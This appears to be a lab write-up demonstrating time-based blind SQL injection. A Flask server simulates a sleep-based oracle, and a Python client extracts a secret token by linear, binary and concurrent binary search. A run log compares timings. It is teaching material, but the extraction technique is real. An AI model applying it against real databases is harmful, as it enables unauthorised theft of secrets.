


```bash
python3 blind_sqli_client.py --target http://192.168.1.30:9001 --concurrency 20
[linear] pos=24 → 1vkwVCZVFck2oqFuHLxYD825
[binary] pos=24 → 1vkwVCZVFck2oqFuHLxYD825
[async-binary] pos=01 FOUND '1' → 1???????????????????????
[async-binary] pos=12 FOUND '2' → 1??????????2????????????
[async-binary] pos=06 FOUND 'C' → 1????C?????2????????????
[async-binary] pos=08 FOUND 'V' → 1????C?V???2????????????
[async-binary] pos=05 FOUND 'V' → 1???VC?V???2????????????
[async-binary] pos=18 FOUND 'L' → 1???VC?V???2?????L??????
[async-binary] pos=07 FOUND 'Z' → 1???VCZV???2?????L??????
[async-binary] pos=23 FOUND '2' → 1???VCZV???2?????L????2?
[async-binary] pos=17 FOUND 'H' → 1???VCZV???2????HL????2?
[async-binary] pos=15 FOUND 'F' → 1???VCZV???2??F?HL????2?
[async-binary] pos=09 FOUND 'F' → 1???VCZVF??2??F?HL????2?
[async-binary] pos=20 FOUND 'Y' → 1???VCZVF??2??F?HL?Y??2?
[async-binary] pos=21 FOUND 'D' → 1???VCZVF??2??F?HL?YD?2?
[async-binary] pos=24 FOUND '5' → 1???VCZVF??2??F?HL?YD?25
[async-binary] pos=11 FOUND 'k' → 1???VCZVF?k2??F?HL?YD?25
[async-binary] pos=03 FOUND 'k' → 1?k?VCZVF?k2??F?HL?YD?25
[async-binary] pos=13 FOUND 'o' → 1?k?VCZVF?k2o?F?HL?YD?25
[async-binary] pos=04 FOUND 'w' → 1?kwVCZVF?k2o?F?HL?YD?25
[async-binary] pos=10 FOUND 'c' → 1?kwVCZVFck2o?F?HL?YD?25
[async-binary] pos=22 FOUND '8' → 1?kwVCZVFck2o?F?HL?YD825
[async-binary] pos=19 FOUND 'x' → 1?kwVCZVFck2o?F?HLxYD825
[async-binary] pos=16 FOUND 'u' → 1?kwVCZVFck2o?FuHLxYD825
[async-binary] pos=14 FOUND 'q' → 1?kwVCZVFck2oqFuHLxYD825
[async-binary] pos=02 FOUND 'v' → 1vkwVCZVFck2oqFuHLxYD825


=== Summary ===
Linear:       95.4s | 824 requests
Binary:       222.4s | 149 requests
Async Binary: 18.8s | 149 requests
Total server requests: 1123
Token: 1vkwVCZVFck2oqFuHLxYD825

```


### Blind SQLi server implmentation

```python
import random
import string
import time

from flask import Flask, jsonify, request

app = Flask(__name__)

TOKEN_LEN = 24
SLEEP_TIME = 3
CHARSET = string.ascii_letters + string.digits

state = {
    "token": None,
    "requests": 0,
    "completed_methods": 0,
}


def new_token():
    return "".join(random.choice(CHARSET) for _ in range(TOKEN_LEN))


@app.before_request
def count_requests():
    state["requests"] += 1


@app.route("/vuln", methods=["POST"])
def vuln():
    """
    Expects JSON:
      {
        "pos": 5,
        "op": ">",
        "value": 77
      }
    Simulates:
      IF(ASCII(SUBSTRING(token, pos, 1)) > value, SLEEP(3), 0)
    """
    data = request.json
    pos = data["pos"]
    op = data["op"]
    value = data["value"]

    token = state["token"]

    if pos < 1 or pos > len(token):
        return jsonify(ok=True)

    c = ord(token[pos - 1])

    condition = {
        ">": c > value,
        "<": c < value,
        "=": c == value,
    }[op]

    if condition:
        time.sleep(SLEEP_TIME)

    return jsonify(ok=True)


@app.route("/length", methods=["POST"])
def length():
    """
    IF(LENGTH(token) > value, SLEEP(3), 0)
    """
    value = request.json["value"]
    if len(state["token"]) > value:
        time.sleep(SLEEP_TIME)
    return jsonify(ok=True)


@app.route("/done", methods=["POST"])
def done():
    state["completed_methods"] += 1
    return jsonify(ok=True)


@app.route("/reset", methods=["POST"])
def reset():
    state["token"] = new_token()
    state["requests"] = 0
    state["completed_methods"] = 0
    return jsonify(ok=True)


@app.route("/stats")
def stats():
    return jsonify(
        token=state["token"],
        requests=state["requests"],
    )


if __name__ == "__main__":
    state["token"] = new_token()
    print("[server] token:", state["token"])
    app.run(host="0.0.0.0", port=9001)

```


### Blind SQLi client implementation

```python
#!/usr/bin/env python3
import argparse
import asyncio
import string
import time
from typing import Dict

import httpx

# -----------------------
# Configuration
# -----------------------

SLEEP_TIME = 3.0
THRESHOLD = 2.5
TIMEOUT = 10.0

CHAR_MIN = 48  # '0'
CHAR_MAX = 122  # 'z'

TOKEN_LEN = 24
CHARSET = string.ascii_letters + string.digits


# -----------------------
# Utilities
# -----------------------


def is_slow(elapsed: float) -> bool:
    return elapsed > THRESHOLD


def status(msg: str) -> None:
    print(f"\r\033[2K{msg}", end="", flush=True)


# -----------------------
# Oracle (sync + async)
# -----------------------


def oracle(
    client: httpx.Client,
    base: str,
    pos: int,
    op: str,
    value: int,
    counter: Dict[str, int],
) -> bool:
    counter["requests"] += 1
    start = time.monotonic()
    client.post(
        f"{base}/vuln",
        json={"pos": pos, "op": op, "value": value},
        timeout=TIMEOUT,
    )
    return is_slow(time.monotonic() - start)


async def oracle_async(
    client: httpx.AsyncClient,
    base: str,
    pos: int,
    op: str,
    value: int,
    counter: Dict[str, int],
) -> bool:
    counter["requests"] += 1
    start = time.monotonic()
    await client.post(
        f"{base}/vuln",
        json={"pos": pos, "op": op, "value": value},
        timeout=TIMEOUT,
    )
    return is_slow(time.monotonic() - start)


# -----------------------
# Linear extraction
# -----------------------


def extract_linear(base: str) -> Dict:
    counter = {"requests": 0}
    token = []

    with httpx.Client() as client:
        for pos in range(1, TOKEN_LEN + 1):
            for c in CHARSET:
                if oracle(client, base, pos, "=", ord(c), counter):
                    token.append(c)
                    status(f"[linear] pos={pos:02d} → {''.join(token)}")
                    break

    print()
    return {
        "token": "".join(token),
        "requests": counter["requests"],
    }


# -----------------------
# Binary extraction
# -----------------------


def extract_binary(base: str) -> Dict:
    counter = {"requests": 0}
    token = []

    with httpx.Client() as client:
        for pos in range(1, TOKEN_LEN + 1):
            lo, hi = CHAR_MIN, CHAR_MAX

            while lo <= hi:
                mid = (lo + hi) // 2
                if oracle(client, base, pos, ">", mid, counter):
                    lo = mid + 1
                else:
                    hi = mid - 1

            token.append(chr(lo))
            status(f"[binary] pos={pos:02d} → {''.join(token)}")

    print()
    return {
        "token": "".join(token),
        "requests": counter["requests"],
    }


# -----------------------
# Async binary extraction
# -----------------------


async def extract_async_binary(base: str, concurrency: int) -> Dict:
    counter = {"requests": 0}
    token = ["?"] * TOKEN_LEN
    sem = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient() as client:

        async def solve_pos(pos: int):
            lo, hi = CHAR_MIN, CHAR_MAX

            async with sem:
                while lo <= hi:
                    mid = (lo + hi) // 2
                    if await oracle_async(client, base, pos, ">", mid, counter):
                        lo = mid + 1
                    else:
                        hi = mid - 1

            token[pos - 1] = chr(lo)
            print(f"[async-binary] pos={pos:02d} FOUND '{chr(lo)}' → {''.join(token)}")

        tasks = [asyncio.create_task(solve_pos(pos)) for pos in range(1, TOKEN_LEN + 1)]
        await asyncio.gather(*tasks)

    print()
    return {
        "token": "".join(token),
        "requests": counter["requests"],
    }


# -----------------------
# Runner
# -----------------------


async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--concurrency", type=int, default=20)
    args = parser.parse_args()

    base = args.target.rstrip("/")

    # Reset once, single token for all methods
    httpx.post(f"{base}/reset")

    results = {}
    timings = {}

    start = time.perf_counter()
    results["linear"] = extract_linear(base)
    timings["linear"] = time.perf_counter() - start

    start = time.perf_counter()
    results["binary"] = extract_binary(base)
    timings["binary"] = time.perf_counter() - start

    start = time.perf_counter()
    results["async-binary"] = await extract_async_binary(base, args.concurrency)
    timings["async-binary"] = time.perf_counter() - start

    server_stats = httpx.get(f"{base}/stats").json()

    print("\n=== Summary ===")
    print(
        f"Linear:       {timings['linear']:.1f}s | "
        f"{results['linear']['requests']} requests"
    )
    print(
        f"Binary:       {timings['binary']:.1f}s | "
        f"{results['binary']['requests']} requests"
    )
    print(
        f"Async Binary: {timings['async-binary']:.1f}s | "
        f"{results['async-binary']['requests']} requests"
    )
    print(f"Total server requests: {server_stats['requests']}")
    print(f"Token: {server_stats['token']}")


if __name__ == "__main__":
    asyncio.run(main())

```